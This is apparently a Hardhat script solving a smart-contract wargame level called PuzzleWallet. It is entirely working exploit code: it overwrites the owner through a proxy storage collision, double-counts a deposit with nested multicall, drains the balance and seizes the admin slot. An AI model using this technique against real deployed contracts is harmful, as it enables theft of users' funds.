import { ethers } from "hardhat";

async function main() {
  const [signer] = await ethers.getSigners();
  const puzzleWallet = await ethers.getContractAt("PuzzleWallet", "0xaF424907392Eb412EE2308eC8247E2384b90D3e9");

  const iface = new ethers.utils.Interface([
    "function deposit()",
    "function execute(address to, uint256 value, bytes calldata data)",
    "function multicall(bytes[] calldata data)",
    "function proposeNewAdmin(address _newAdmin)"
  ]);
  const payloadOwner = iface.encodeFunctionData("proposeNewAdmin", [signer.address]);

  let tx = await signer.sendTransaction({ to: puzzleWallet.address, data: payloadOwner });
  await tx.wait(3);
  console.log("owner overwritten");

  tx = await puzzleWallet.addToWhitelist(signer.address);
  await tx.wait(3);
  console.log("whitelisted");

  tx = await puzzleWallet.multicall([
    iface.encodeFunctionData("deposit"),
    iface.encodeFunctionData("multicall", [
      [
        iface.encodeFunctionData("deposit")
      ]
    ]),
    iface.encodeFunctionData("execute", [
      signer.address, ethers.utils.parseEther("0.002"), []
    ])
  ], { value: ethers.utils.parseEther("0.001") });
  await tx.wait(3);
  console.log("contract drained");

  tx = await puzzleWallet.setMaxBalance(signer.address);
  await tx.wait(1);
  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
